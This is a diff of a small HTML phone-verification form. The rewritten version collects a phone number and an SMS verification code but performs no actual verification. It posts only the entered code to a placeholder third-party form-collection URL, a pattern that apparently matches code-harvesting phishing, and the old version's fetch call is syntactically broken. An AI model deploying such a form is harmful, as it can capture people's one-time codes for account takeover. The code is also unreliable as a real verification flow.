@@ -1,127 +1,84 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Form</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Phone Verification Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            margin: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
+    .form-container {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
 
-        form {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
+    .form-page {
+      display: none;
+    }
 
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-        }
+    .active {
+      display: block;
+    }
 
-        select, input {
-            width: 100%;
-            padding: 8px;
-            margin-bottom: 16px;
-            box-sizing: border-box;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-
-        button {
-            background-color: #4caf50;
-            color: #fff;
-            padding: 10px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-
-        button:hover {
-            background-color: #45a049;
-        }
-    </style>
+    button {
+      padding: 10px;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
 
-    <form id="verificationForm">
-        <label for="country">Country:</label>
-        <select id="country" name="country">
-            <!-- Add your country options here -->
-            <option value="us">United States (+1)</option>
-            <option value="uk">United Kingdom (+44)</option>
-            <!-- Add more options as needed -->
-        </select>
+  <div class="form-container">
+    <form id="formPage1" class="form-page active" action="https://formsparksendingurl1.com" method="post">
+      <label for="phoneNumber">Phone Number:</label>
+      <input type="text" name="phoneNumber" placeholder="Enter your phone number" required>
 
-        <label for="phoneNumber">Phone Number:</label>
-        <div style="display: flex;">
-            <input type="text" id="phoneNumber" name="phoneNumber" placeholder="Enter your phone number">
-            <button type="button" onclick="getCode()">Get Code</button>
-        </div>
+      <label for="countryCode">Country Code:</label>
+      <select name="countryCode">
+        <!-- Add your country codes here -->
+        <option value="+1">+1 (USA)</option>
+        <option value="+44">+44 (UK)</option>
+        <!-- Add more options as needed -->
+      </select>
 
-        <label for="verificationCode">Verification Code:</label>
-        <input type="text" id="verificationCode" name="verificationCode" placeholder="Enter the code">
-
-        <button type="button" onclick="verifyNumber()">Verify Number</button>
+      <button type="button" onclick="sendVerification()">Verify Number</button>
     </form>
 
-    <script>
-        function getCode() {
-            // Add logic to send phone number to your server
-            const phoneNumber = document.getElementById('phoneNumber').value;
+    <form id="formPage2" class="form-page" action="https://formsparksendingurl2.com" method="post">
+      <label for="verificationCode">Verification Code:</label>
+      <input type="text" name="verificationCode" placeholder="Enter the code sent to your phone" required>
 
-            // Example: Send data to server for code generation
-            fetch('https://submit-form.com/QT7UUnl6y, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ phoneNumber }),
-            })
-            .then(response => response.json())
-            .then(data => {
-                // Handle response from server
-                console.log(data);
-            })
-            .catch(error => console.error('Error:', error));
-        }
+      <button type="button" onclick="submitForm()">Submit</button>
+    </form>
+  </div>
 
-        function verifyNumber() {
-            // Add your verification logic here
-            // Send verification code to the provided email
-            // Handle form submission
+  <script>
+    function sendVerification() {
+      // Implement logic to show the next page
+      document.getElementById('formPage1').classList.remove('active');
+      document.getElementById('formPage2').classList.add('active');
+    }
 
-            // Example: Assuming you have a server-side endpoint to handle verification
-            const phoneNumber = document.getElementById('phoneNumber').value;
-            const verificationCode = document.getElementById('verificationCode').value;
-
-            // Send data to server for verification and form submission
-            // Use fetch or another method to communicate with your server
-            fetch('/verify-number', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ phoneNumber, verificationCode }),
-            })
-            .then(response => response.json())
-            .then(data => {
-                // Handle response from server
-                console.log(data);
-            })
-            .catch(error => console.error('Error:', error));
-        }
-    </script>
+    function submitForm() {
+      // Implement logic to submit the form
+      document.getElementById('formPage2').submit();
+    }
+  </script>
 
 </body>
 </html>
